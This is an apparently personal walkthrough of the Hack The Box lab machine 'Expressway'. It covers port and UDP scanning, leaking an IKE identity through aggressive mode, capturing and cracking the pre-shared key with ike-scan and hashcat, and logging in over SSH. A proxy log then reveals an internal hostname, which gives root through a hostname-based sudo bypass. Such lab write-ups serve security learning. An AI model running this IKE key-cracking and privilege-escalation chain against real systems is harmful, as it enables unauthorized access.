![[1.png]]

Add the `expressway.htb` to /etc/hosts
```bash
echo "10.10.11.87 expressway.htb" >> /etc/hosts
```
## Network Scan

### Rustscan

```bash
rustscan -a expressway.htb -- -sV
```

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.  
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |  
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |  
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'  
The Modern Day Port Scanner.  
________________________________________  
: http://discord.skerritt.blog         :  
: https://github.com/RustScan/RustScan :  
--------------------------------------  
Port scanning: Making networking exciting since... whenever.  
  
[~] The config file is expected to be at "/root/.rustscan.toml"  
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1073741716'.  
Open 10.10.11.87:22  
[~] Starting Script(s)  
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.11.87  
Depending on the complexity of the script, results may take some time to appear.  
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 16:24 UTC  
NSE: Loaded 47 scripts for scanning.  
Initiating Ping Scan at 16:24  
Scanning 10.10.11.87 [4 ports]  
Completed Ping Scan at 16:24, 2.23s elapsed (1 total hosts)  
Initiating Parallel DNS resolution of 1 host. at 16:24  
Completed Parallel DNS resolution of 1 host. at 16:24, 0.05s elapsed  
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]  
Initiating SYN Stealth Scan at 16:24  
Scanning 10.10.11.87 [1 port]  
Discovered open port 22/tcp on 10.10.11.87  
Completed SYN Stealth Scan at 16:24, 0.51s elapsed (1 total ports)  
Initiating Service scan at 16:24  
Scanning 1 service on 10.10.11.87  
Completed Service scan at 16:24, 0.91s elapsed (1 service on 1 host)  
NSE: Script scanning 10.10.11.87.  
NSE: Starting runlevel 1 (of 2) scan.  
Initiating NSE at 16:24  
Completed NSE at 16:24, 0.00s elapsed  
NSE: Starting runlevel 2 (of 2) scan.  
Initiating NSE at 16:24  
Completed NSE at 16:24, 0.00s elapsed  
Nmap scan report for 10.10.11.87  
Host is up, received echo-reply ttl 62 (2.0s latency).  
Scanned at 2025-09-28 16:24:10 UTC for 2s  
  
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 10.0p2 Debian 8 (protocol 2.0)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Read data files from: /usr/share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 3.99 seconds  
          Raw packets sent: 9 (348B) | Rcvd: 6 (220B)
```

We found absolutely nothing other than ssh i thought the machine was broken then i did udp port scanning using nmap and it was hella slow so i used a tool called udpx

if you dont have it installed , install it using(Optional):

```bash
sudo apt install golang
go install -v github.com/nullt3r/udpx/cmd/udpx@latest
```

```bash
udpx -t 10.129.13.112 -c 128 -w 1000
```
Output
```bash
       __  ______  ____ _  __  
      / / / / __ \/ __ \ |/ /  
     / / / / / / / /_/ /   /    
    / /_/ / /_/ / ____/   |     
    \____/_____/_/   /_/|_|     
        v1.0.7, by @nullt3r  
  
2025/09/28 16:52:22 [+] Starting UDP scan on 1 target(s)  
2025/09/28 16:52:43 [*] 10.10.11.87:500 (ike)  
2025/09/28 16:52:59 [+] Scan completed
```

We found an ike(Internet Key Exchange) server running on udp 500

## Small BG about IKE

KE is the complex handshake protocol that allows two endpoints to agree on cryptographic keys and algorithms to build a secure IPsec tunnel. It has two main versions, IKEv1 and IKEv2, with IKEv1 having some known security weaknesses, particularly in its “Aggressive Mode.”
IKEv1’s Main Mode uses six messages to protect identities. However, Aggressive Mode cuts this down to three messages for a faster connection, but at the cost of sending the initiator and responder’s identities in the clear. If the server supports it, we can force it into this mode to leak valuable information.
## Enumeration

Since we found ike lets run some enum using ike-scan

Install if not present in your deb distro (Optional)

```bash
sudo apt install ike-scan
```

```
sudo ike-scan expressway.htb
```

Output
```bash
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)  
10.10.11.87     Main Mode Handshake returned HDR=(CKY-R=62cd3fde81e8bd60) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Aut  
h=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Pe  
er Detection v1.0)  
  
Ending ike-scan 1.9.6: 1 hosts scanned in 0.831 seconds (1.20 hosts/sec).  1 returned handshake; 0 returned notify
```

This response is incredibly valuable:

- **Main Mode Handshake:** The server responded in Main Mode, which is more secure as it protects peer identities.
- **Weak Cryptography:** It supports `3DES` (a legacy, weak cipher), `SHA1` (no longer considered secure), and `Group=2:modp1024` (a weak Diffie-Hellman group susceptible to precomputation attacks).
- **Auth=PSK:** Authentication is done via a **Pre-Shared Key**. This is the secret we need to find.

**Aggressive Mode Scan:**

```
sudo ike-scan -A expressway.htb
```
Output
```bash
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)  
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=a36c0bbdbff6ff67) SA=(Enc=3DES Hash=SHA1 Group=2:modp10  
24 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=i  
ke@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(  
20 bytes)  
  
Ending ike-scan 1.9.6: 1 hosts scanned in 0.453 seconds (2.21 hosts/sec).  1 returned handshake; 0 returned notify
```

### Cracking the Key and Gaining Access

Now we have a username (`ike`) and know the authentication method is a PSK. The final step is to capture the authentication hash from the Aggressive Mode exchange and crack the PSK offline.

#### Capturing the PSK Hash

`ike-scan` can automatically format the necessary data for cracking with its sister tool, `psk-crack`. We re-run the Aggressive Mode scan, providing the identity we just found, and tell it to save the cracking material.

**Command:**

```
sudo ike-scan -A expressway.htb --id=ike@expressway.htb -Pike.psk
```
- `--id`: Specifies the identity to use in our request.
- `-P<file>`: Saves the PSK cracking parameters to the specified file.

Just use any hash cracking tool to crack ike.psk i am using hashcat

```bash
hashcat ike.psk /usr/share/wordlists/rockyou.txt
```

We found the password

![[2.png]]

Lets use these creds to check if we can log in via SSH

```bash
ssh ike@expressway.htb
```

We got in!!
![[3.png]]
Lets grab the user flag
## User flag

```bash
cat user.txt
```

```bash
7b354d{Redacted}25c0ce
```

## Privilege Escalation
After enumeration and linpeas and everything i couldnt find a stable path to root then i looked at this
```bash
sudo -l
```
Output
![[4.png]]
It is saying the above which is not a standard error output given by sudo 
Trying where the sudo is located
```bash
which sudo
```

![[5.png]]
Sudo is located in local bin which is also an unlikely path which confirms that the sudo is a custom script.

Now even trying all the shenanigans for above i couldnt reach anything related to root!

The linpease suggested that i am in a group called proxy lets check that out
```bash
id
```

![[6.png]]
So we are in proxy group maybe we can access some logs 
lets try different logs , the only interesting log  was in /var/log/squid/access.log.1

```bash
cat access.log.1    
1753229566.990      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229580.379      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229580.417     15 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3944 GET /nmaplowercheck1753229281 - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /flumemaster.jsp - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3916 GET /master.jsp - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3914 GET /.git/HEAD - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /tasktracker.jsp - HIER_NONE/- text/html  
1753229688.847      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3914 GET /rs-status - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://www.google.com/ - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3902 POST /sdk - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -  
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html  
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 XDGY / - HIER_NONE/- text/html  
1753229689.010      0 192.168.68.50 NONE_NONE/400 3916 GET /evox/about - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3906 GET /HNAP1 - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 TCP_DENIED/403 381 HEAD http://www.google.com/ - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3934 GET /browseDirectory.jsp - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3924 GET /jobtracker.jsp - HIER_NONE/- text/html  
1753229689.058      0 192.168.68.50 NONE_NONE/400 3916 GET /status.jsp - HIER_NONE/- text/html  
1753229689.114      0 192.168.68.50 NONE_NONE/400 3916 GET /robots.txt - HIER_NONE/- text/html  
1753229689.114      0 192.168.68.50 NONE_NONE/400 3922 GET /dfshealth.jsp - HIER_NONE/- text/html  
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229689.165      0 192.168.68.50 NONE_NONE/400 3918 GET /favicon.ico - HIER_NONE/- text/html  
1753229689.222      0 192.168.68.50 TCP_DENIED/403 3768 CONNECT www.google.com:80 - HIER_NONE/- text/html  
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.322      0 192.168.68.50 NONE_NONE/400 381 HEAD / - HIER_NONE/- text/html  
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229689.475      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.526      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html  
1753229689.629      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.680      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.783      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229689.933      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229690.086      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html  
1753229719.140      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229719.245      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html  
1753229760.700      0 192.168.68.50 NONE_NONE/400 3918 GET /randomfile1 - HIER_NONE/- text/html  
1753229760.722      0 192.168.68.50 NONE_NONE/400 3908 GET /frand2 - HIER_NONE/- text/html
```

A client tried to access an internal-only host named `offramp.expressway.htb` through the proxy. This hostname is not public and gives us a new piece of information to use.

### Hostname-Based Policy Bypass


    We have a custom sudo binary at /usr/local/bin/sudo.
    It gives us a custom denial message that mentions our current hostname (expressway).
    We’ve found a second, internal hostname (offramp.expressway.htb).

The logic suggests that the custom sudo binary’s policy might depend on the hostname. Sudo has a -h flag to specify a host to run a command on. Let’s try running a command with our custom sudo but telling it we are on the offramp host.

```bash
sudo -h offramp.expressway.htb /bin/bash
```
Yes we got root!!

![[7.png]]

## Root Flag

Now lets grab the root flag 
```bash
cd
cat root.txt
```

```FLAG
3f9{REDACTED}02
```
